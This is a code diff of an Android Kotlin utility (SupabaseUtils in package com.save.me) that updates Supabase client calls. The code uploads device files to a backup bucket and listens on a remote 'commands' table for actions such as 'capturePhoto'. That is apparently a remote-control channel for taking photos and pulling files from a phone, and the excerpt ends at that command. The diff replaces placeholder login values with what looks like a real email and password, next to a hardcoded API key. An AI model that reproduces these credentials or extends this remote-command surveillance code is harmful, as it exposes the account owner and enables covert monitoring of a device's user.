@@ -3,15 +3,18 @@ package com.save.me
 import io.github.jan.supabase.SupabaseClient
 import io.github.jan.supabase.createSupabaseClient
 import io.github.jan.supabase.storage.storage
+import io.github.jan.supabase.realtime.realtime
 import io.github.jan.supabase.realtime.channel
 import io.github.jan.supabase.realtime.postgresChangeFlow
+import io.github.jan.supabase.realtime.PostgresAction
 import io.github.jan.supabase.postgrest.postgrest
-import io.github.jan.supabase.gotrue.gotrue
-import io.github.jan.supabase.gotrue.user
+import io.github.jan.supabase.auth.auth
+import io.github.jan.supabase.auth.providers.builtin.Email
 import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.collectLatest
 import kotlinx.serialization.json.buildJsonObject
 import kotlinx.serialization.json.put
+import kotlinx.serialization.json.jsonPrimitive
 import org.json.JSONObject
 import android.content.Context
 import java.io.File
@@ -19,15 +22,15 @@ import java.io.File
 object SupabaseUtils {
     private const val SUPABASE_URL = "https://yxdnyavcxouutwkvdoef.supabase.co"
     private const val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZG55YXZjeG91dXR3a3Zkb2VmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcwNjE0MDQsImV4cCI6MjA2MjYzNzQwNH0.y07v2koScA07iztFr366pB5f5n5UCCzc_Agn228dujI"
-    private const val EMAIL = "YOUR_EMAIL"       // Replace with your email
-    private const val PASSWORD = "YOUR_PASSWORD" // Replace with your password
+    private const val EMAIL = "kambojistheking@gmail.com"       // Replace with your email
+    private const val PASSWORD = "#Sand@beach1" // Replace with your password
 
     val supabase: SupabaseClient by lazy {
         createSupabaseClient(
             supabaseUrl = SUPABASE_URL,
             supabaseKey = SUPABASE_KEY
         ) {
-            install(io.github.jan.supabase.gotrue.Auth)
+            install(io.github.jan.supabase.auth.Auth)
             install(io.github.jan.supabase.postgrest.Postgrest)
             install(io.github.jan.supabase.storage.Storage)
             install(io.github.jan.supabase.realtime.Realtime)
@@ -38,15 +41,14 @@ object SupabaseUtils {
 
     suspend fun checkConnection(): Boolean = withContext(Dispatchers.IO) {
         return@withContext try {
-            if (supabase.gotrue.currentUserOrNull() == null) {
-                val session = supabase.gotrue.loginWith(io.github.jan.supabase.gotrue.credentials.Email) {
+            val activeSession = supabase.auth.currentSessionOrNull()
+            if (activeSession == null) {
+                supabase.auth.signInWith(Email) {
                     email = EMAIL
                     password = PASSWORD
                 }
-                userId = session.user?.id
-            } else {
-                userId = supabase.gotrue.currentUserOrNull()?.id
             }
+            userId = supabase.auth.currentUserOrNull()?.id
             userId != null
         } catch (_: Exception) {
             false
@@ -57,7 +59,7 @@ object SupabaseUtils {
         val uid = userId ?: return@withContext
         val bucket = "device-backups"
         try {
-            supabase.storage.from(bucket).upload(supaPath, file.readBytes())
+            supabase.storage["device-backups"].upload(supaPath, file.readBytes())
             supabase.postgrest["files"].insert(
                 buildJsonObject {
                     put("user_id", uid)
@@ -84,16 +86,17 @@ object SupabaseUtils {
         CoroutineScope(Dispatchers.IO).launch {
             checkConnection()
             val uid = userId ?: return@launch
-            val channel = supabase.channel("public:commands")
-            channel.postgresChangeFlow(
-                schema = "public",
-                table = "commands",
-                event = io.github.jan.supabase.realtime.PostgresAction.INSERT,
-                filter = { eq("user_id", uid) }
-            ).collectLatest { change ->
-                val cmd = change.record
-                val type = cmd["type"]?.toString() ?: return@collectLatest
-                val optionsJson = cmd["options"]?.toString() ?: "{}"
+            val channel = supabase.realtime.channel("public:commands")
+            // Listen for INSERT events on the commands table
+            channel.postgresChangeFlow<PostgresAction.Insert>("public") {
+                table = "commands"
+            }.collectLatest { change ->
+                // change is PostgresAction.Insert, get record as JsonObject
+                val record = change.record
+                val userIdField = record["user_id"]?.jsonPrimitive?.content
+                if (userIdField != uid) return@collectLatest
+                val type = record["type"]?.jsonPrimitive?.content ?: return@collectLatest
+                val optionsJson = record["options"]?.jsonPrimitive?.content ?: "{}"
                 val options = try { JSONObject(optionsJson) } catch (_: Exception) { JSONObject() }
                 when (type) {
                     "capturePhoto" -> {
